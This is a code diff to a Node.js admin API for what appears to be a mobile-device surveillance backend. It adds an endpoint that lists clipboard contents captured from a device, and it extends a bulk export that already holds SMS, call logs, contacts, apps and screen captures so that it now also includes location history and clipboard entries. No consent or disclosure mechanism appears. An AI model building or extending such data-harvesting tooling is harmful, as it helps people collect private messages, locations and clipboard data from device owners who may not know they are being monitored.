@@ -530,6 +530,30 @@ router.delete('/connections/:deviceId/screen-captures/:captureId', adminAuth, (r
   }
 });
 
+// GET /api/admin/connections/:deviceId/clipboard — get clipboard entries for a device
+router.get('/connections/:deviceId/clipboard', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 100;
+    const offset = (page - 1) * limit;
+
+    const total = db.prepare('SELECT COUNT(*) as count FROM clipboard_entries WHERE device_id = ?').get(deviceId);
+    const entries = db.prepare(
+      'SELECT * FROM clipboard_entries WHERE device_id = ? ORDER BY clip_timestamp DESC LIMIT ? OFFSET ?'
+    ).all(deviceId, limit, offset);
+
+    res.json({
+      entries,
+      total: total ? total.count : 0,
+      page,
+      totalPages: Math.ceil((total ? total.count : 0) / limit),
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // GET /api/admin/connections/:deviceId/export — export all device data as JSON
 router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
   try {
@@ -544,6 +568,8 @@ router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
     const callLogs = db.prepare('SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC').all(deviceId);
     const contacts = db.prepare('SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC').all(deviceId);
     const apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);
+    const locations = db.prepare('SELECT * FROM location_history WHERE device_id = ? ORDER BY recorded_at DESC LIMIT 500').all(deviceId);
+    const clipboard = db.prepare('SELECT * FROM clipboard_entries WHERE device_id = ? ORDER BY clip_timestamp DESC LIMIT 500').all(deviceId);
 
     // Parse JSON fields in contacts
     const parsedContacts = contacts.map(c => {
@@ -559,11 +585,15 @@ router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
       call_logs: callLogs,
       contacts: parsedContacts,
       installed_apps: apps,
+      location_history: locations,
+      clipboard_entries: clipboard,
       summary: {
         total_sms: sms.length,
         total_calls: callLogs.length,
         total_contacts: contacts.length,
         total_apps: apps.length,
+        total_locations: locations.length,
+        total_clipboard: clipboard.length,
       },
     };
 
